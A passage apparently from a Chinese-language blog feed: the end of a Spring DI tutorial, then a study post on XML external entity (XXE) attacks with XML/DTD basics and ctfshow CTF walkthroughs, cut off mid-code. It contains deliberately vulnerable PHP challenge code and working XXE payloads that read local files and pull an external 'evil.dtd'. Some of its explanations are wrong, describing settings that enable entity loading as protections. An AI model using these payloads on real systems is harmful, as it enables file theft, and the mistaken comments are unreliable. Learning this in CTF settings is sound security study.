class="attr">name</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">props</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">prop</span> <span class="attr">key</span>=<span class="string">&quot;npy&quot;</span>&gt;</span>无<span class="tag">&lt;/<span class="name">prop</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">props</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;phone&quot;</span> <span class="attr">class</span>=<span class="string">&quot;pojo.Phone&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;phoneNo&quot;</span> <span class="attr">value</span>=<span class="string">&quot;114514&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="在测试类中测试效果-4"><a href="#在测试类中测试效果-4" class="headerlink" title="在测试类中测试效果"></a>在测试类中测试效果</h4><p>在 TestSpring.java 中添加：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br><span class="line"><span class="keyword">import</span> pojo.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSpring</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">testDI</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassPathXmlApplicationContext</span>(<span class="string">&quot;applicationContext.xml&quot;</span>);</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> context.getBean(<span class="string">&quot;stu&quot;</span>, Student.class);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">        System.out.println(student.getInfo());</span><br><span class="line">        System.out.println(student.getPhone());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">创建一个Student对象，使用无参构造方法创建对象。</span><br><span class="line">setPhone方法运行，参数是：null</span><br><span class="line">Student&#123;id=<span class="number">1</span>, name=&#x27;张三&#x27;, age=<span class="number">20</span>, books=[book1, book2], hobbies=[吃饭, 睡觉], friends=&#123;基友=基友, 闺蜜=闺蜜&#125;, games=[game1, game2]&#125;</span><br><span class="line">&#123;npy=无&#125;</span><br><span class="line">null</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE 学习记录</title>
    <url>/2024/03/11/XXE%20%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>前言：</p>
<p>上上周的青少年CTF擂台挑战赛 2024 #Round 1中，有一道XXE的题目，结合我对 moectf 那道XXE的印象，感觉都是直接复制、黏贴答案模板后改改就出了，没有系统的认真学；趁着有想法的时候把 XXE 系统学个一遍。。。</p>
<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="什么是-XXE？"><a href="#什么是-XXE？" class="headerlink" title="什么是 XXE？"></a>什么是 XXE？</h2><p>XXE 全称是：XML External Entity，也就是 XML 外部实体注入攻击，由于程序在解析输入的 XML 数据时，解析了攻击者伪造的外部实体而产生的。有XXE漏洞的标志性函数为<code>simplexml_load_string()</code>。漏洞是在对不安全的外部实体数据进行处理时引发的安全问题。</p>
<h2 id="XML-基础学习（-XXE-要从认识-XML-开始）："><a href="#XML-基础学习（-XXE-要从认识-XML-开始）：" class="headerlink" title="XML 基础学习（ XXE 要从认识 XML 开始）："></a>XML 基础学习（ XXE 要从认识 XML 开始）：</h2><p>XML指可扩展标记语言（EXtensible Markup Language）是一种标记语言，很类似 HTML。XML的设计宗旨是传输数据，而非显示数据。XML标签没有被预定义。需要自行定义标签。XML被设计为具有自我描述性。XML是 W3C 的推荐标准。</p>
<h3 id="XML-是不作为的："><a href="#XML-是不作为的：" class="headerlink" title="XML 是不作为的："></a>XML 是不作为的：</h3><p>也许这有点难以理解，但是 XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</p>
<p>下面是 John 写给 George 的便签，存储为 XML ：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>上面的这条便签具有自我描述性。它拥有标题以及留言，同时包含了发送者和接受者的信息。但是，这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。除此之外，XML 是纯文本，且允许创作者定义自己的标签和文档结构，是独立于软件和硬件的信息传输工具。</p>
<h2 id="DTD-："><a href="#DTD-：" class="headerlink" title="DTD ："></a>DTD ：</h2><p>文档类型定义（DTD）可定义合法的 XML 文档构建模块。它使用一系列合法的元素来定义文档的结构。</p>
<p>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
<h3 id="一些前置XML元素知识："><a href="#一些前置XML元素知识：" class="headerlink" title="一些前置XML元素知识："></a>一些前置XML元素知识：</h3><h4 id=""><a href="#" class="headerlink" title="&lt;!ELEMENT&gt;"></a><code>&lt;!ELEMENT&gt;</code></h4><p>在XML中，<code>&lt;!ELEMENT&gt;</code> 元素用于定义元素的结构和内容模型。具体来说，<code>&lt;!ELEMENT&gt;</code> 元素可以用来：</p>
<ol>
<li>定义元素的名称：<code>&lt;!ELEMENT&gt;</code> 元素指定了XML文档中允许出现的元素的名称。</li>
<li>定义元素的内容模型：<code>&lt;!ELEMENT&gt;</code> 元素可以指定元素的内容模型，即元素可以包含哪些子元素以及它们的顺序和数量。</li>
</ol>
<p>例如，下面是一个使用 <code>&lt;!ELEMENT&gt;</code> 元素定义元素的示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT person (firstname, lastname, age)&gt;</span><br></pre></td></tr></table></figure>

<p>在这个示例中，<code>&lt;!ELEMENT&gt;</code> 元素定义了一个名为”person”的元素，它包含了三个子元素：firstname、lastname 和 age。这样就规定了”person”元素的结构和内容模型。</p>
<p>通过使用 <code>&lt;!ELEMENT&gt;</code> 元素，可以在XML文档中明确定义元素的结构，有助于确保文档的有效性和一致性。</p>
<h4 id="-1"><a href="#-1" class="headerlink" title="&lt;!ENTITY&gt;"></a><code>&lt;!ENTITY&gt;</code></h4><p>在XML中，<code>&lt;!ENTITY&gt;</code> 元素用于定义实体。</p>
<h3 id="内部的-DOCTYPE-声明："><a href="#内部的-DOCTYPE-声明：" class="headerlink" title="内部的 DOCTYPE 声明："></a>内部的 DOCTYPE 声明：</h3><p>假如 DTD 被包含在您的 XML 源文件中，它应当通过下面的语法包装在一个 DOCTYPE 声明中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>带有 DTD 的 XML 文档实例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<h4 id="以上-DTD-解释如下："><a href="#以上-DTD-解释如下：" class="headerlink" title="以上 DTD 解释如下："></a>以上 DTD 解释如下：</h4><p><strong>!DOCTYPE note</strong> (第二行)定义此文档是 <strong>note</strong> 类型的文档（note为根元素）。</p>
<p><strong>!ELEMENT note</strong> (第三行)定义 <strong>note</strong> 元素有四个元素：”to、from、heading、body”，如果是<code>&lt;!ELEMENT note ANY&gt;</code>则表示可以接受<strong>任何元素</strong></p>
<p><strong>!ELEMENT to</strong> (第四行)定义 <strong>to</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT from</strong> (第五行)定义 <strong>from</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT heading</strong> (第六行)定义 <strong>heading</strong> 元素为 “#PCDATA” 类型</p>
<p><strong>!ELEMENT body</strong> (第七行)定义 <strong>body</strong> 元素为 “#PCDATA” 类型</p>
<h3 id="外部文档声明："><a href="#外部文档声明：" class="headerlink" title="外部文档声明："></a>外部文档声明：</h3><p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个 XML 文档和上面的 XML 文档相同，但是拥有一个外部的 DTD: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">	&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">	&lt;body&gt;Don not forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure>

<p>这是包含 DTD 的 “note.dtd” 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DTD的作用："><a href="#DTD的作用：" class="headerlink" title="DTD的作用："></a>DTD的作用：</h3><ul>
<li>通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</li>
<li>通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</li>
<li>您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</li>
<li>您还可以使用 DTD 来验证您自身的数据。</li>
</ul>
<h3 id="实体："><a href="#实体：" class="headerlink" title="实体："></a>实体：</h3><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p>
<h4 id="实体类别与引用："><a href="#实体类别与引用：" class="headerlink" title="实体类别与引用："></a>实体类别与引用：</h4><h5 id="通用实体："><a href="#通用实体：" class="headerlink" title="通用实体："></a>通用实体：</h5><p>用 <code>&amp;实体名;</code> 引用的实体，他在 DTD 中定义，在 XML 文档中引用</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; </span><br><span class="line">]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br></pre></td></tr></table></figure>

<p>在这个例子中，实体 <code>&amp;file;</code> 引用了位于”file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini”路径下的文件。</p>
<h5 id="参数实体："><a href="#参数实体：" class="headerlink" title="参数实体："></a>参数实体：</h5><p>使用 <code>% 实体名</code>（<strong>这里面空格不能少</strong>） 在 DTD 中定义，并且<strong>只能在 DTD 中使用 <code>%实体名;</code> 引用</strong><br>只有在 DTD 文件中，参数实体的声明才能引用其他实体<br>和通用实体一样，参数实体也可以外部引用</p>
<p>实例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">    &lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">    &lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">    &lt;message&gt;%an-element; %remote-dtd;&lt;/message&gt;</span><br><span class="line">&lt;/note&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在这个示例中：</p>
<p>第一个参数实体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这个参数实体名为”an-element”，其内容是一个用于定义元素结构的字符串，指定了一个名为”mytag”的元素，它包含一个名为”subtag”的子元素。</p>
<p>第二个参数实体定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>这个参数实体名为”remote-dtd”，其内容是一个外部实体引用，指定了一个外部DTD文件的位置。</p>
<p>通过使用参数实体，我们可以在XML文档中定义可重复使用的片段，提高文档的可读性和可维护性。</p>
<p>实体根据引用方式，还可分为内部实体与外部实体</p>
<h5 id="内部实体："><a href="#内部实体：" class="headerlink" title="内部实体："></a>内部实体：</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>实例：</p>
<p>DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注释：别忘记一个通用实体由三部分构成：一个和号 ( <code>&amp;</code> )，一个<code>实体名称</code>， 以及一个分号 ( <code>;</code> )</p>
<h5 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体:"></a>外部实体:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>URL中能写哪些类型的外部实体呢？如图所示：</p>
<p><img src="https://s2.loli.net/2023/12/20/WiJR52dgfnx9Dpb.png" alt="image-20231008193523097"></p>
<p>实列：</p>
<p>DTD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br><span class="line">&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>XML：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;writer;</span><span class="symbol">&amp;copyright;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>当然，还有一种引用方式是使用 引用 <strong>公用 DTD</strong> 的方法，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>这个在我们的攻击中也可以起到和 <code>SYSTEM</code> 一样的作用</p>
<h4 id="XML外部实体注入："><a href="#XML外部实体注入：" class="headerlink" title="XML外部实体注入："></a>XML外部实体注入：</h4><p>XML External Entity Injection 即 xml 外部实体注入漏洞，简称XXE漏洞。XXE是针对解析XML输入的应用程序的一种攻击。 当弱配置的XML解析器处理包含对外部实体的引用的XML输入时，就会发生此攻击。 这种攻击可能导致信息泄露，命令执行，拒绝服务，SSRF，内网端口扫描以及其他系统影响。</p>
<h5 id="有回显读敏感文件"><a href="#有回显读敏感文件" class="headerlink" title="有回显读敏感文件"></a>有回显读敏感文件</h5><p>本题为 ctfshow web 373 题的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>以下是代码的简要解释：</p>
<ol>
<li><code>error_reporting(0);</code> - 禁用错误报告，这意味着将不会显示任何错误信息。</li>
<li><code>libxml_disable_entity_loader(false);</code> - 启用XML实体加载器，这是为了防止XML外部实体注入攻击。</li>
<li><code>$xmlfile = file_get_contents(&#39;php://input&#39;);</code> - 从输入中获取XML文件的内容。</li>
<li><code>if(isset($xmlfile))&#123;...&#125;</code> - 检查是否成功获取XML文件内容。</li>
<li><code>$dom = new DOMDocument();</code> - 创建一个新的DOMDocument对象，用于处理XML文档。</li>
<li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code> - 加载XML文件内容到DOMDocument对象中，并禁用实体和DTD加载，以防止实体注入攻击。</li>
<li><code>$creds = simplexml_import_dom($dom);</code> - 将DOMDocument对象转换为SimpleXMLElement对象，以便于访问XML数据。</li>
<li><code>$ctfshow = $creds-&gt;ctfshow;</code> - 从XML数据中提取ctfshow元素的值。</li>
<li><code>echo $ctfshow;</code> - 将ctfshow元素的值输出到页面上。</li>
<li><code>highlight_file(__FILE__);</code> - 在页面上高亮显示当前PHP文件的源代码。</li>
</ol>
<p>贴个payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE Ed3n [</span><br><span class="line">&lt;!ELEMENT Ed3n ANY&gt;</span><br><span class="line">	&lt;!ENTITY payload SYSTEM &quot;file:///flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;Ed3n&gt;</span><br><span class="line">	&lt;ctfshow&gt;&amp;payload;&lt;/ctfshow&gt;</span><br><span class="line">&lt;/Ed3n&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/03/11/YxXB7c3PtpydFEr.png" alt="image-20240311181553404"></p>
<p>但我看到了 K0rz3n 佬读取复杂文件名的操作，感觉分别可以应用在读取Linux和Windows的flag上。</p>
<p>以下为主要内容摘要：</p>
<blockquote>
<blockquote>
<p>有些内容可能<strong>不想让解析引擎解析</strong>执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 <code>&lt; &gt; &amp; &quot;</code>  字符，CDATA 元素中的所有字符都会被当做元素字符数据的常量部分，而不是 xml 标记</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;![CDATA[</span><br><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line">]]&gt;</span><br></pre></td></tr></table></figure>

<p>可以输入任意字符除了 <code>]]&gt;</code> 不能嵌套<br>用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA 包起来</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</p>
<p>首先，找到问题出现的地方，问题出现在</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;...</span><br><span class="line">&gt;&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt;</span><br><span class="line">&gt;&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>引用并不接受可能会引起 xml 格式混乱的字符（在XML中，有时实体内包含了些字符，如<code>&amp;,&lt;,&gt;,&quot;,&#39;</code>等。这些均需要对其进行转义，否则会对XML解释器生成错误），我们想在引用的两边加上 <code>&quot;&lt;![CDATA[&quot;和 “]]&gt;”</code> ，但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&gt;&lt;!DOCTYPE roottag [</span><br><span class="line">  &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">&gt;]&gt;</span><br><span class="line">&gt;&lt;roottag&gt;&amp;start;&amp;goodies;&amp;end;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

<p>注意，这里面的三个实体都是字符串形式，连在一起居然报错了，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在xml 中调用，那么要想在 DTD 中拼接，我们知道我们只有一种选择，就是使用参数实体</p>
</blockquote>
<p>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

<p><strong>evil.dtd</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<p><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</code>：指定XML版本为1.0，字符编码为UTF-8。</p>
<p><code>&lt;!DOCTYPE roottag [...]&gt;</code>：定义了名为”roottag”的根元素，并在内部包含了一组实体定义。</p>
<p><code>&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</code>：定义了名为”start”的参数实体，内容为”&lt;![CDATA[“，用于表示CDATA块的起始部分。</p>
<p><code>&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</code>：定义了名为”goodies”的参数实体，指向本地文件”d:&#x2F;test.txt”，用于引入外部实体内容。</p>
<p> <code>&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</code>：定义了名为”end”的参数实体，内容为”]]&gt;”,用于表示CDATA块的结束部分。</p>
<p> <code>&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</code>：定义了名为”dtd”的参数实体，指向远程DTD文件”<code>http://ip/evil.dtd</code>“。<br> <code>%dtd;</code>：在DOCTYPE声明中引用了”dtd”参数实体，将远程DTD文件的内容插入到文档中。</p>
<p> <code>&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code>：XML文档的根元素为”roottag”，其中引用了名为”all”的通用实体，从而达到拼接的目的。</p>
<p>第二个XML代码片段中的<code>evil.dtd</code>文件定义了一个名为<code>all</code>的通用实体，其内容为<code>%start;%goodies;%end;</code>，表示<code>all</code>实体由<code>start</code>、<code>goodies</code>和<code>end</code>三个实体组成。</p>
<h5 id="无回显读敏感文件："><a href="#无回显读敏感文件：" class="headerlink" title="无回显读敏感文件："></a>无回显读敏感文件：</h5><p>本题为 ctfshow web 374 题的源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2021-01-07 12:59:52</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2021-01-07 13:36:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, 